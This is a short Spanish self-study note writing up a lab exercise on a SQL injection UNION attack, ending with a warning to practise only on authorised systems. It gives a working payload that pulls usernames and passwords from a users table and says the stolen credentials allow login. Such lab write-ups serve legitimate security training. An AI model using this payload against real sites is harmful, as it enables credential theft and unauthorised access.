---
title: "5 - SQL injection UNION attack, retrieving data from other tables"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Tenemos el siguiente laboratorio:
![[Pasted image 20240507183336.png]]
Haciendo clic en alguna de las categorías, vemos que se hace la query en cada una de ellas:
![[Pasted image 20240507183500.png]]
Por lo que podemos usar el siguiente payload:
```bash
/filter?category=Corporate+gifts'+UNION+SELECT+username,+password+FROM+users--
```
Y vemos cómo obtenemos los usuarios:
![[Pasted image 20240507183604.png]]
Si probamos en acceder con alguna de las cuentas, funciona:
![[Pasted image 20240507183659.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
